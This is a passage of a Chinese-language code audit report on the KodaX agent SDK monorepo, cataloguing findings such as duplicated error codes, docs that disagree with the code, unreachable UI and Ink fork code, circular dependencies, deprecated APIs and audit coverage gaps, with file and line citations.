`packages/agent/src/public-entrypoints.test.ts` 只检查 5 个函数存在；`src/sdk-independence.test.ts:57-73` 只检查子路径键；`tests/fixtures/product-client-types/consumer.ts` 只编译 `/client` 的固定子集。入口清单手写在三处互不校验：`package.json` 的 `exports`、`scripts/build-dts.mjs:85-100`、`scripts/build-bundle.mjs:470`（`build-dts.mjs:19-31` 注释写 11 个输出，实际 14 个）。`sdk-client.d.ts` 引用 53 个未导出的第一方类型，`sdk-runtime.d.ts` 引用 168 个，例如 `ClientAutoModeStats.denials`/`.breaker` 用内部 `DenialTracker`/`CircuitBreaker`（`packages/coding/src/client-contract.ts:1160-1161`），`ClientRunOutcome.result` 是 `KodaXResult`（`:912`）：Space 无法从 `/client` 命名这些类型，改 guardrail 内部类型会悄悄改变产品契约。

### F-30 · 词表与错误码手抄多处 · VERIFIED
daemon 诊断与生命周期错误码同时定义在 `src/runtime-daemon/schema.ts:1508-1537` 和 `src/sdk-runtime.ts:1517-1527,2314-2318`，server 按 schema 校验自己的结果（`server.ts:3830`）：只在 TS 联合里加码，`sessions.diagnostics` 和 `runs.read` 就返回 `internal_error`。`daemon_upgrade_required` 是裸字符串（`runtime-daemon/client.ts` 约 10 处、`client-runtime-adapter.ts:27,48`、`workflow-command-live.ts:560`），同义码 `daemon_capability_upgrade_required`（`sdk-runtime.ts:492`），两者都不在 `RuntimeDaemonErrorCode`（`protocol.ts:299-324`）。`workMode`/`agentMode` 已有 `KodaXWorkMode`（`packages/coding/src/types.ts:2181`）仍在 5 处重写；权限模式字面量散在 5 处；`sharedSessionSettings.keys` 在 `server.ts:2864-2876` 与 `sdk-runtime.ts:4422-4434` 各一份；`src/recovering-runtime-client.ts:25` 硬编码 `'protocol_closed'`、`'transport_error'`。

### F-32 · SDK 文档与代码不符 · VERIFIED
`docs/SDK_MIGRATION.md:364` 写 `CostRecord.cost`，实际是 `TokenUsageRecord.cost`（`packages/llm/src/cost-tracker.ts:13,22`）；`public_docs/sdk/embedder-guide.md:1861` 从 `@kodax-ai/kodax` 导入任何子路径都不导出的 `listConstructedAgents`；同文件 `:1642` 从 `/coding` 导入只存在于 `/repl` 的 `SessionData`；`CLIENT_CONTRACT.md:5`、`SDK_MIGRATION.md:135` 声称核对于 `b70d2d30`，已落后 HEAD 69 个提交；`examples/embedded-agent.ts:26`、`examples/otel-export.ts:24-33` 导入未发布的私有包 `@kodax-ai/coding`、`@kodax-ai/agent`。

### F-33 · FEATURE_302 没有 ADR/HLD/DD，凭据存储的变化没有正式记录 · VERIFIED
**状态：未修复。** 更正："违反 ADR-068"证据不足：钥匙串在 ADR-068 里是背景，核心决定是按需、限定范围、可撤销的授权。FEATURE_302 的设计与 SDK 文档已存在，缺的是 ADR/HLD/DD 索引，以及现行存储与旧后端读取边界的正式记录。
`docs/HLD.md`、`docs/DD.md`、`docs/ADR.md` 中 FEATURE_302、Responses transport、Bedrock、Vertex、Mistral 出现次数都是 0；HLD/DD 的"最后更新"仍是 FEATURE_298/299/301。ADR 编号停在 ADR-070，`ADR.md` 顶部三个十月下旬条目没有编号。ADR-068（`docs/ADR.md:6512`）规定 Space 把 Provider 密钥放进系统钥匙串，而 `docs/LLM_INTEGRATION.md:81` 说 OAuth 现在写进共享 `auth.json`，没有 ADR 取代前者。`createEncryptedOAuthSessionStore`、`createWindowsOAuthSessionStore` 从 `/runtime` 导出但无文档。`docs/FEATURE_LIST.md:528` 把目标版本写成 v0.7.99。

### F-34 · 文档体量超过可读范围 · VERIFIED
`docs/KNOWN_ISSUES.md` 1,044,758 字节 / 18,482 行（约 200 个已解决条目未归档，34 处 Open）；`docs/ADR.md` 560,924 字节；`docs/release.md` 191,191 字节；`docs/HANDOFF.md` 175,232 字节。`docs/CLAUDE.md` 的文档清单也过期：`HANDOFF.md`、`LLM_INTEGRATION.md`、`CLIENT_CONTRACT.md`、`SDK_MIGRATION.md` 都在用却不在清单里。

### F-35 · repl 里的第二份 Ink fork 大部分不可达 · VERIFIED
`packages/repl/src/tui/substrate/ink/` 跟踪 65 个手写 `.js`、55 个 `.js.map`、28 个 `.ts`。生产只经两个入口进入：`render-to-string.js`（`ui/utils/render-finalized-sections.tsx:23`）和 `inline-scrollback-ledger.ts`（`InkREPL.tsx:471`、`ui/utils/inline-ledger-controller.ts:13`）。从入口追踪：可达 24 个，不可达 54 个、约 4,937 行；不可达的 8 个 `.ts` 还带着单测，测的是生产不走的代码。`input-parser.js`、`parse-keypress.js`、`kitty-keyboard.js` 在 `tui/core/` 有 live 版本，这里是副本。55 个 `.js.map` 被跟踪，因为 `.gitignore:18` 的 `src/**/*.js.map` 锚定在仓库根。

### F-36 · 未使用的依赖与不可达的 UI · VERIFIED
`packages/repl/package.json:36-39` 的 `ink-spinner`、`ink-text-input` 没有任何导入，`ink` 只被 1 个测试文件导入，三者都是运行时依赖。约 11 个 UI 文件（约 1.2k 行）不被生产代码引用：`ui/App.tsx`、`ToolGroup.tsx`、`LayeredMessageSurface.tsx`、`SessionHistory.tsx`、`PendingInputsIndicator.tsx`、`useKeypress.ts`、`useKeypressed.ts`、`useQueuedPrompts.ts`、`mock-ui.ts`、`prompt-surface-layout.ts`、`MessageList.tsx:871` 的 `LegacyMessageList`。它们经 `src/sdk-repl.ts:27` 公开。`InkREPL.tsx:218` 导入 `createPermissionContext` 但从不调用。

### F-40 · 两份 `process-tree.ts` 已经分叉 · 分叉 VERIFIED，后果 SUSPECTED
`packages/llm/src/cli-events/process-tree.ts`（702 行）头部要求与 `packages/agent/src/runtime/process-tree.ts`（1257 行）同步。agent 版本在 2026-10-29/31 拿到了 Windows Job 隔离与进程身份修复（a3035337e、986cedd66、adc8bbc06），llm 版本停在 2026-09-14。没有一致性测试；Gemini CLI、Codex CLI 这类 Provider 子进程可能拿不到新保护。

### F-41 · 其他重复实现 · 多数 VERIFIED
`auth.json` 路径至少在 6 处各自拼接：`src/cli-provider-credentials.ts:12`、`provider-credential-manager.ts:47`、`provider-oauth-store.ts:8`、`packages/repl/src/common/provider-setup.ts:114`、`src/sandbox-runtime.ts:4721`、`agent-home-policy.ts:14`；一处改名，沙箱 deny 规则就可能和真实写入路径脱节。reasoningMode → effort 的映射复制 4 份：`run-substrate.ts:492`、`runner-driven.ts:408`、`llm-adapter.ts:289`、`task-engine.ts:339`。`learned-skill-runtime.ts` 只被 `run-substrate.ts:188` 导入，AMA 路径可能没有绑定学到的 Skill（SUSPECTED）。

**状态：未修复。** 撤回 effort 一条：这几处都调用同一个 `mapLegacyReasoningModeToEffortIntent`，不是复制的实现。learned Skill 一条升为 VERIFIED：GPT 用同一个 learned Skill 和同一个临时身份离线复现，SA 请求里有这个 Skill，AMA 请求里没有，两次都正常结束。

### F-43 · 工程基线 · VERIFIED
**状态：未修复。** 更正：根 `src` 的测试已经整体纳入类型检查（`tsconfig.test.json:68-69` 的 `src/**/*.test.ts(x)`，基线时就是这样），"229 个中的 17 个"是算错了。包内测试仍然只有逐个列出的少数文件被检查。fast 层的导入耗时没有做 profile，不能据此删测试；`test:bundle` 多次运行有跨平台和打包的目的，减少前要先证明覆盖等价。
没有 linter，测试大多不做类型检查（原文：`tsconfig.test.json` 只列入根 `src` 229 个测试中的 17 个、`tests/*.test.ts` 111 个中的 50 个；包内 1,002 个测试文件基本不检查）；`packages/repl/tsconfig.json` 排除了只被测试使用的 `src/tui/substrate/ink/terminal-emulator.ts`；`test:bundle` 每个 tag 跑 8 次，Windows v2、Electron、文本门禁在 CI 与 release 中重复。fast 层 13 分钟里 6 分钟花在模块导入。

## P3

### F-19 · 手册事实错误与提示词的 ADR-033 违规 · VERIFIED
手册：Windows 沙箱 setup generation 在 `manual-topics.json:578` 写 10，`:1615,1873` 写 11，代码是 11（`src/sandbox-runtime.ts:1125`）；公开 Kimi 列表（`:198-203`）漏了 `kimi-k3.1-pro` 与 `-highspeed`；`:95,2145` 写 Node >= 20，`package.json:243` 要求 `>=20.16.0`；全文有 71 行带 alpha/beta/v0.7 版本号。
提示词：`static-text.json:185` "Before exploring 3+ files"、`managed-tool-text.ts:41` "≤40 lines, ≤3 bullet levels" 是数量阈值；`static-text.json:253` "at least two substantive independent lanes" 与 "require no progress AND a faster path" 是复合条件；精简版编辑描述（`static-text.json:228`）只剩 "Read first."，丢了完整版（`:20`）里的原因。这些在 alpha.10 的树里检索不到，是 alpha.10 之后新写的。

### F-31 · 包内目录级循环依赖 · VERIFIED
coding 16 个目录构成一个环（`permissions/permission.ts → tools/registry.js` 与 `tools/undo.ts → permissions/agent-home-policy.js` 等）；repl 6 个；llm 3 个；agent 无。与 CLAUDE.md 的"禁止循环依赖"冲突，目前没有引发初始化顺序故障。

### F-37 · 无调用者的符号 · 部分 VERIFIED
已确认：`packages/coding/src/agent-runtime/middleware/judges.ts` 的 5 个 CAP-017/018/088 导出（51fb53d32 有意删除调用点，`run-substrate.ts:474,3247` 的注释还说过它们在这里）；`tools/memory-mutation-guard.ts:9` 的 `shellMemoryMutationDenial`；`packages/llm/src/providers/base.ts:321` 的 `setMaxOutputTokensOverride` 及其 AsyncLocalStorage（已撤回：它是公开的一次性兼容接口，`base.ts:339-341` 仍读取它的值，不能删）；`WINDOWS_TEXT_TRANSACTION_PROTOCOL`、`isKodaXSessionUiHistory`、`commands/registry.ts:277` 的 `globalCommandRegistry`、`permission-config.ts:251` 的 `saveAlwaysAllowTool`、`idle-yield.ts:118` 的 `isIdleYieldEnabled`、`createSkillWatcher`；`scripts/exclude-tests-from-build.mjs`、`patch-publish-fields.mjs`、`probe-sdk-stdin.mjs`（0 引用）。
审计代理报告、未逐个确认：`CompactionConfig.*Percent`、`CompactionCacheContext.reasoning`、`MemoryPack.hints`、`semantic_prefetch`、media shim、`turn-context.ts`、`runner-nudges.ts`、`parse-helpers.ts`、`prompts/memory-section.ts`、`output-filters/compiled`、`memory/policy-artifact.ts`、`agents/index.ts`、`parallel-dispatch.ts`、`onChildProgress`、`MANUAL_*_MAX_BYTES`、`fallbackToNormalExecution`、`inferPermissionMode`、`orchestration.ts`（1056 行）。

### F-38 · 已弃用但仍被调用、需先迁移的项 · VERIFIED
`createWindowsTrustedTextMutationHost`（1 个生产文件 + 2 个测试，约 23 处）；`packages/coding/src/providers/index.ts` 弃用 barrel（8 个导入方）；auto-mode 的 `rules`/`askUser` 管道；`pollIntervalMs`、`CompactionConfig.enabled`、`userInvocable`（client 契约）、`candidateRefs`、`WorkflowRuntime.output`（`embedder-guide.md:4721` 等仍有引用）；`CostRate.cachePer1M`（约 17 行定价数据里唯一的缓存价）；`reasoningPreset`/`reasoningCapability`/`supportsThinking`（`packages/llm/src/types.ts:657,794` 的 `@deprecated` 说"加载时自动迁移"，三个字段在能力表中分别出现 64、57、16 次；更正：自定义 Provider 的旧字段在 `custom-provider.ts:203-234` 加载时会归一化，"实际没有迁移"只对内置能力表成立）；学习 Skill 的按 binding 迁移（两个 binder 仍在调用，`migratedActive = 0`）；episode review v1、workflows 旧开关、`KODAX_REPOINTEL_*` 桥、auto-mode 旧 `<block>` 解析器；`OrchestrationTraceEvent` 的错误 `@deprecated` 标注；无效输入 `envPass`、`enabled`、`timeoutMs` 与永远为 `[]` 的 `harnessTransitions`。

### F-39 · 已过期的兼容窗口 · 部分 VERIFIED
**状态：未修复。** 撤回 CLI 一条：`src/cli_option_helpers.ts:193-197` 在基线时就拒绝 `amaw`，不是映射。SDK 与历史数据读取时的兼容归一化是另一回事，用户要求旧配置可读可迁移。`matchesBashPatternLegacy` 已被 F-22 替换。
原文：`amaw → ama` 仍在 `src/cli_option_helpers.ts:193`；`src/runtime-daemon/schema.ts:1489`、`src/sdk-runtime.ts:18245` 的枚举仍接受 `'sa'` 和 `'amaw'`，而 CLI 已退役 SA。权限模式别名（`packages/repl/src/common/utils.ts:281,318`）、`-n`/`-y` 无操作参数、`kodax_cli.ts:3346` 的死分支（审计代理报告）。`POST_COMPLETION_LINGER_MS`/`lastAllCompletedAt` 已超期约 59 个版本。计划 0.8 再处理的（`ensureExampleConfigFile`、`autoStart`、`userInvocableOnly`、`activeAgentTasks`、`allow_always` 作用域、tool-result-budget 与截断 guardrail 的兼容项、`matchesBashPatternLegacy`）目前仍保留。

### F-42 · 两套 session / compaction 栈并存 · VERIFIED
Layer A（`packages/agent/src/primitives/session.ts`、`compaction.ts`，coding `index.ts:1084` 再导出）与实际生产使用的 `KodaXSessionLineage` 并存。`packages/coding/src/index.ts:1086-1089` 的注释说 `KodaXSessionLineage` 已被取代、计划在 FEATURE_086（v0.7.27）移除，实际情况相反：生产仍用它，被"取代"的那套才是闲置的。

## 刻意选择，不是问题

- CI 只在打 tag 或手动触发时运行（`.github/workflows/ci.yml:13-15`，`release.yml:10-14` 只在推 `v*` tag 时调用）：这是为减少 CI 触发次数做的取舍（曾列为 F-01，现已从问题列表移除）。代价是 tag 之前的提交不做检查，失败在发布当天才暴露；tag 那次运行的 Windows 覆盖缺口见 F-02。
- 撤掉工具输出启动时的全量扫描与 TTL 删除（84922d76d）：防止误删别的 SDK 会话还在引用的原件。缺的是替代它的引用感知清理，见 F-21。
- effort 与 profile 提示不再每次显示（`866d1bdb8`、`9e3147da4`、`306eafdfa`）。
- 移除默认 judges（51fb53d32），不恢复它们的开销。
- `skill` 工具豁免 allowed-tools（F-21a 第二段）。
- 工具派发对未激活工具 fail-closed、run 进入终态后抑制旧配置回调、无法确认身份的子进程改为隔离（F-21b）。
- 未知费用返回 `null`，不猜价（F-13）。
- 兼容输入和旧数据读取保留到有明确迁移为止（F-38、F-39、F-42）。
- 所有权无法证明的锁、损坏的凭证和配置，保留原件并阻断，不按 TTL 强行回收、不悄悄换账号。方向是对的，缺诊断和可执行的修复路径，见 F-44、F-45。

## 看起来像遗留、但仍在用，不属于问题

DPAPI sealed 存储（旧凭据迁移来源）；"legacy" 渲染器（tmux 回退路径）；classic REPL；`legacy-tool-pairing.ts` 与 `legacyReports`；worker 入口文件；Runtime 原子写入器（`sdk-runtime.ts:17411-17458`）与 `state.ts:585-630` 的 EPERM 重试；`store-lock.ts` 的票据队列；run 状态索引重建；actor owner 的 TCP 存活探测；workflow worktree 清扫；managed-child 隔离；`auth-file` 的 proper-lockfile；Opus 4.7/4.8 的能力与价格；K3 的对齐测试；Zhipu/Z.ai 的输出上限（只作用于无模型级条目的模型）。

## 本次审计未覆盖

只实际运行了 `tsc`（根 `src` 与部分测试）和 `test:fast`；unit、system、contract、integration、eval 层、真实沙箱与打包门禁没有执行，相关结论来自静态阅读和 GitHub Actions 记录。基线清单里原本把"session-migration 锁自身的过期回收"列为仍在用的机制，`2ee4a782d` 删掉了它，见 F-45。

第一批修复的复核只做了：读 `4606eda91..68a02521c` 的 diff；用临时 `KODAX_HOME` 跑已构建的 CLI（F-44）；用发现脚本扫描未被选中的平台相关文件（约 30 个提到 win32 的文件未被选中，抽查的都是在 Linux 上模拟平台，不需要真 Windows）。没有重跑测试套件；`bundled-shell-cleanup.test.mjs` 的偶发失败根因未确认，以 GPT 的回归指南为准。

未审计：checkpoint、capacity-recovery、history-capacity-recovery、`windows-text-transaction` 原生日志、MCP OAuth token 存储、`kodax_resume`、`shell-execution`、多实例场景、`src/sdk-runtime-public.ts` 新增的 322 行、`state.cutover.test.ts`。
